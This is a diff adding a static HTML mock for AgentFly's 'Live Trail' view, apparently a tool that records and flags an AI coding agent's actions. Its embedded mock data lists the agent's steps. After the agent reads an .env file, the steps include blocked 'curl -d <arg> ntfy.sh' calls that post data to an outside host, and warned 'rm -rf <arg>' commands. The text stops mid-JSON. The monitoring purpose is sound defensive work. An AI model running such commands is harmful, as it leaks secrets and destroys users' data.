@@ -1,0 +1,307 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentFly · Live Trail (S4 mock)</title>
+<!-- S4 throwaway mock. One static file: no build step, no CDN, never served by the app.
+     Steps below = longSession(240) from ui/src/graph/mock.ts, dumped to JSON (see docs/spikes/S4-trail.md). -->
+<style>
+  :root {
+    --canvas: #0e1116; --surface: #161b22; --raised: #1c232c; --line: #2a323d;
+    --ink: #e6edf3; --muted: #a8b3c5;
+    --step: #374151; --blocked: #ef4444; --fill-blocked: #7f1d1d; --chip-blocked: #fecaca;
+    --warned: #a78bfa; --fill-warned: #4c1d95; --chip-warned: #ddd6fe;
+    --secret: #d97706; --fill-secret: #f59e0b; --link: #60a5fa; --fill-link: #1e3a8a;
+    --ok: #34d399;
+    --mono: ui-monospace, SFMono-Regular, Menlo, monospace;
+  }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; height: 100%; background: var(--canvas); color: var(--ink);
+    font: 14px/1.4 ui-sans-serif, system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif; overflow: hidden; }
+  button { font: inherit; color: inherit; }
+  :focus-visible { outline: 2px solid var(--link); outline-offset: 2px; }
+  .app { display: grid; grid-template-rows: auto 1fr; height: 100%; }
+
+  /* header + health strip */
+  header { display: flex; align-items: center; gap: 12px; padding: 10px 20px; border-bottom: 1px solid var(--line); }
+  header h1 { font-size: 15px; margin: 0; letter-spacing: .01em; }
+  nav { display: flex; gap: 2px; margin-left: 8px; }
+  nav button { background: none; border: 0; padding: 6px 12px; border-radius: 6px; color: var(--muted); cursor: default; }
+  nav button[aria-current="page"] { background: var(--raised); color: var(--ink); }
+  .spacer { flex: 1; }
+  .health { display: flex; align-items: center; gap: 8px; color: var(--muted); font-size: 12.5px; }
+  .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--ok); }
+  .chip { display: inline-block; font-size: 11px; font-weight: 700; letter-spacing: .04em; text-transform: uppercase;
+    padding: 2px 7px; border-radius: 4px; }
+  .chip.secret { background: var(--fill-secret); color: #1a1100; }
+  .chip.blocked { background: var(--chip-blocked); color: #450a0a; }
+  .chip.warned { background: var(--chip-warned); color: #2e1065; }
+  .chip.ok { background: transparent; color: var(--muted); border: 1px solid var(--line); font-weight: 600; }
+
+  main { display: grid; grid-template-columns: minmax(0, 1fr) 460px; min-height: 0; }
+
+  /* trail column */
+  .trail-col { display: flex; flex-direction: column; min-height: 0; border-right: 1px solid var(--line); }
+  .pinned { padding: 10px 20px 12px; border-bottom: 1px solid var(--line); background: var(--surface); }
+  .pinned h2 { font-size: 11px; text-transform: uppercase; letter-spacing: .08em; color: var(--muted); margin: 0 0 8px; font-weight: 600; }
+  .pin-row { display: flex; align-items: baseline; gap: 10px; margin-top: 6px; flex-wrap: wrap; }
+  .pin-row .lbl { font-size: 12.5px; min-width: 120px; color: var(--muted); }
+  .pin-row .lbl b { color: var(--ink); }
+  .pin { font: 600 12px var(--mono); padding: 2px 7px; border-radius: 4px; border: 1px solid; background: transparent; cursor: pointer; }
+  .pin.b { border-color: var(--blocked); color: var(--chip-blocked); }
+  .pin.b:hover, .pin.b[aria-pressed="true"] { background: var(--fill-blocked); }
+  .pin.w { border-color: var(--warned); color: var(--chip-warned); }
+  .pin.w:hover, .pin.w[aria-pressed="true"] { background: var(--fill-warned); }
+  .pin[aria-pressed="true"] { outline: 2px solid var(--ink); outline-offset: 1px; }
+
+  .toolbar { display: flex; align-items: center; gap: 12px; padding: 8px 20px; color: var(--muted); font-size: 12.5px; border-bottom: 1px solid var(--line); }
+  .toolbar .sp { flex: 1; }
+  .follow { background: var(--raised); border: 1px solid var(--line); border-radius: 6px; padding: 3px 10px; cursor: pointer; }
+  .follow[aria-pressed="true"] { border-color: var(--link); color: var(--link); }
+
+  .trail { overflow-y: auto; padding: 8px 20px 24px; flex: 1; scroll-behavior: auto; }
+  .row { display: grid; grid-template-columns: 56px 1fr auto; align-items: center; gap: 10px; min-height: 34px;
+    padding: 4px 10px; border-radius: 6px; border-left: 3px solid transparent; }
+  .no { font: 12px var(--mono); color: var(--muted); text-align: right; }
+  .what { min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .kind { display: inline-block; min-width: 44px; font-weight: 600; color: var(--muted); margin-right: 4px; }
+  .mono { font-family: var(--mono); font-size: 13px; }
+  .badge { font-size: 11px; font-weight: 700; letter-spacing: .04em; text-transform: uppercase; padding: 2px 7px; border-radius: 4px; }
+
+  /* routine groups */
+  details.group { margin: 2px 0; }
+  details.group > summary { list-style: none; cursor: pointer; display: grid; grid-template-columns: 56px 1fr auto; gap: 10px;
+    align-items: center; min-height: 34px; padding: 4px 10px; border-radius: 6px; color: var(--muted); border-left: 3px solid transparent; }
+  details.group > summary::-webkit-details-marker { display: none; }
+  details.group > summary:hover { background: var(--surface); }
+  details.group > summary .no { color: #7d8896; }
+  details.group[open] > summary { background: var(--surface); }
+  .gsum b { color: var(--ink); font-weight: 600; }
+  .caret::before { content: '▸'; display: inline-block; width: 14px; transition: transform .12s; }
+  details[open] > summary .caret::before { transform: rotate(90deg); }
+  .inner { padding: 2px 0 6px 28px; }
+  .inner .row { min-height: 28px; font-size: 13px; color: var(--muted); }
+
+  /* pinned rows in the trail */
+  .row.alarm { cursor: pointer; margin: 3px 0; min-height: 40px; }
+  .row.alarm.b { background: var(--fill-blocked); border-left-color: var(--blocked); }
+  .row.alarm.w { background: #2e1f5a; border-left-color: var(--warned); }
+  .row.alarm.b:hover { background: #8f2222; }
+  .row.alarm.w:hover { background: #3a2872; }
+  .row.alarm .no { color: #e8c9c9; }
+  .row.alarm[aria-selected="true"] { outline: 2px solid var(--ink); outline-offset: -2px; }
+  .row.secret { background: rgba(217, 119, 6, .14); border-left-color: var(--secret); margin: 3px 0; min-height: 40px; }
+  .row.secret .no { color: #f3c98a; }
+  .row.trigger { box-shadow: inset 0 0 0 2px var(--secret); }
+  .row.chain-end { box-shadow: inset 0 0 0 2px var(--blocked); }
+  .badge.trig { background: var(--fill-secret); color: #1a1100; }
+
+  /* Why card */
+  .why { padding: 20px; overflow-y: auto; background: var(--surface); }
+  .why .eyebrow { font-size: 11px; text-transform: uppercase; letter-spacing: .08em; color: var(--muted); font-weight: 600; }
+  .why h2 { margin: 4px 0 6px; font-size: 18px; line-height: 1.25; }
+  .why .rule-line { color: var(--muted); font-size: 13px; margin-bottom: 14px; }
+
+  .chain { position: relative; height: 226px; margin: 6px 0 14px; }
+  .chain svg { position: absolute; inset: 0; width: 100%; height: 100%; overflow: visible; }
+  .box { position: absolute; left: 0; width: 240px; border-radius: 8px; padding: 8px 10px; border: 1.5px solid var(--line); background: var(--step); }
+  .box small { display: block; color: var(--muted); font-size: 11.5px; }
+  .box .t { font-size: 13px; }
+  .box.sec { background: rgba(217, 119, 6, .16); border-color: var(--secret); top: 0; }
+  .box.mid { background: var(--raised); border-style: dashed; top: 86px; height: 44px; display: flex; align-items: center; color: var(--muted); font-size: 12.5px; }
+  .box.blk { background: var(--fill-blocked); border-color: var(--blocked); top: 142px; }
+  .box.blk .t { font-weight: 600; }
+  .pill { position: absolute; left: 300px; top: 172px; width: 120px; padding: 6px 0; text-align: center; font-weight: 700;
+    border-radius: 999px; background: var(--fill-blocked); border: 1.5px solid var(--blocked); }
+  .host { position: absolute; left: 300px; top: 132px; width: 120px; padding: 4px 0; text-align: center; font: 600 12px var(--mono);
+    border-radius: 4px; background: var(--fill-link); border: 1.5px solid var(--link); }
+  .stepn { font: 700 11px var(--mono); color: var(--ink); background: #0006; padding: 1px 6px; border-radius: 3px; margin-right: 6px; }
+
+  .why h3 { font-size: 11px; text-transform: uppercase; letter-spacing: .08em; color: var(--muted); margin: 16px 0 6px; font-weight: 600; }
+  .msg { background: var(--canvas); border: 1px solid var(--line); border-radius: 6px; padding: 8px 10px; font-size: 13px; }
+  .msg b { display: block; font-size: 11px; color: var(--muted); font-weight: 600; margin-bottom: 2px; letter-spacing: .03em; }
+  .msg + .msg { margin-top: 6px; }
+  .cmd { font: 12.5px var(--mono); background: var(--canvas); border: 1px solid var(--line); border-radius: 6px; padding: 8px 10px; color: var(--ink); }
+  .note { color: var(--muted); font-size: 12px; margin-top: 6px; }
+  .why .none { color: var(--muted); }
+</style>
+</head>
+<body>
+<div class="app">
+  <header>
+    <h1>AgentFly</h1>
+    <nav aria-label="Views">
+      <button aria-current="page">Live Trail</button><button>History</button><button>Rules</button><button>Graph</button>
+    </nav>
+    <span class="chip ok" id="count"></span>
+    <span class="chip secret">Secret seen</span>
+    <span class="spacer"></span>
+    <div class="health"><span class="dot"></span> Recorder up · 127.0.0.1:8787 · session mock-0</div>
+  </header>
+  <main>
+    <section class="trail-col" aria-label="Trail">
+      <div class="pinned" id="pinned"></div>
+      <div class="toolbar">
+        <span id="summary"></span><span class="sp"></span>
+        <button class="follow" id="follow" aria-pressed="false">Follow latest</button>
+      </div>
+      <div class="trail" id="trail" tabindex="0"></div>
+    </section>
+    <aside class="why" id="why" aria-label="Why card"></aside>
+  </main>
+</div>
+
+<script id="steps" type="application/json">[{"order":40000,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40001,"kind":"read","verdict":"allowed","tool":null,"file":".env","sensitive":true,"command":null,"host":null,"rule":null},{"order":40002,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40003,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40004,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40005,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40006,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40007,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40008,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40009,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40010,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40011,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40012,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40013,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40014,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40015,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40016,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40017,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40018,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40019,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40020,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40021,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40022,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40023,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40024,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40025,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40026,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40027,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40028,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40029,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40030,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40031,"kind":"shell","verdict":"warned","tool":null,"file":null,"sensitive":false,"command":"rm -rf \u003carg>","host":null,"rule":"R2"},{"order":40032,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40033,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40034,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40035,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40036,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40037,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40038,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40039,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40040,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40041,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40042,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40043,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40044,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40045,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40046,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40047,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40048,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40049,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40050,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40051,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40052,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40053,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40054,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40055,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40056,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40057,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40058,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40059,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40060,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40061,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40062,"kind":"shell","verdict":"warned","tool":null,"file":null,"sensitive":false,"command":"rm -rf \u003carg>","host":null,"rule":"R2"},{"order":40063,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40064,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40065,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40066,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40067,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40068,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40069,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40070,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40071,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40072,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40073,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40074,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40075,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40076,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40077,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40078,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40079,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40080,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40081,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40082,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40083,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40084,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40085,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40086,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40087,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40088,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40089,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40090,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40091,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40092,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40093,"kind":"shell","verdict":"warned","tool":null,"file":null,"sensitive":false,"command":"rm -rf \u003carg>","host":null,"rule":"R2"},{"order":40094,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40095,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40096,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40097,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40098,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40099,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40100,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40101,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40102,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40103,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40104,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40105,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40106,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40107,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40108,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40109,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40110,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40111,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40112,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40113,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40114,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40115,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40116,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40117,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40118,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40119,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40120,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40121,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40122,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40123,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40124,"kind":"shell","verdict":"warned","tool":null,"file":null,"sensitive":false,"command":"rm -rf \u003carg>","host":null,"rule":"R2"},{"order":40125,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40126,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40127,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40128,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40129,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40130,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40131,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40132,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40133,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40134,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40135,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40136,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40137,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40138,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40139,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40140,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40141,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40142,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40143,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40144,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40145,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40146,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40147,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40148,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40149,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40150,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40151,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40152,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40153,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40154,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40155,"kind":"shell","verdict":"warned","tool":null,"file":null,"sensitive":false,"command":"rm -rf \u003carg>","host":null,"rule":"R2"},{"order":40156,"kind":"shell","verdict":"blocked","tool":null,"file":null,"sensitive":false,"command":"curl -d \u003carg> ntfy.sh","host":"ntfy.sh","rule":"R1"},{"order":40157,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm test","host":null,"rule":null},{"order":40158,"kind":"read","verdict":"allowed","tool":null,"file":"README.md","sensitive":false,"command":null,"host":null,"rule":null},{"order":40159,"kind":"tool","verdict":"allowed","tool":"search","file":null,"sensitive":false,"command":null,"host":null,"rule":null},{"order":40160,"kind":"read","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40161,"kind":"edit","verdict":"allowed","tool":null,"file":"src/app.ts","sensitive":false,"command":null,"host":null,"rule":null},{"order":40162,"kind":"shell","verdict":"allowed","tool":null,"file":null,"sensitive":false,"command":"npm 